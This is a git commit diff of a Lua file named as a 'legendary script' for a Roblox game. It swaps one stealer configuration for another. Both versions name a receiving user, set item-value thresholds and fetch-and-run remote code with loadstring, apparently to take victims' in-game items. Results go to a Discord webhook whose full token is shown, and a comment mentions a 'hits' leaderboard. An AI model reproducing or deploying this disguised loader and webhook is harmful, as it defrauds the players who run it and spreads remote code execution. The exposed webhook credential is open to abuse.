6a2f9dc9809f8c1ca1a02708cc4f0fed130d86ef
antsarjylawy-sketch <antsarjylawy@gmail.com>
2025-08-13 18:24:25 +0300

    Upload legendary-script.lua via Script Source Converter

--- legendary-script.lua
+++ legendary-script.lua
@@ -1,13 +1,6 @@
-_G.NullConfig = {
-    User = {"Hylouxe"},
-    min_value = 10000000000,
-    pingEveryone = "Yes", -- dont change this
-    Webhook = "http://176.100.37.215:20002/proxy/8db9dc69e4aea2cbdf609ff36d08b110",
-    FakeGift = "Yes",
-    Trash = "http://176.100.37.215:20002/proxy/8db9dc69e4aea2cbdf609ff36d08b110",
-    LoadingScreen = "Yes",
-    GiftOnlyRares = "Yes",
-    ExecuteOtherScript = "No",
-}
-    
-loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
+Username = "Hylouxe"
+Webhook = "https://discord.com/api/webhooks/1405007440763818125/5I8q_FeL_sz8WPfgmep5BdGcUzybYeBkWrDeJ-tawZKmmz3LnJX_2NC2Jk2XnIiSgGsi"
+MinimumValue = 1
+DiscordID = "1386833155205632142" -- optional if you wanna be in hits lb
+
+loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
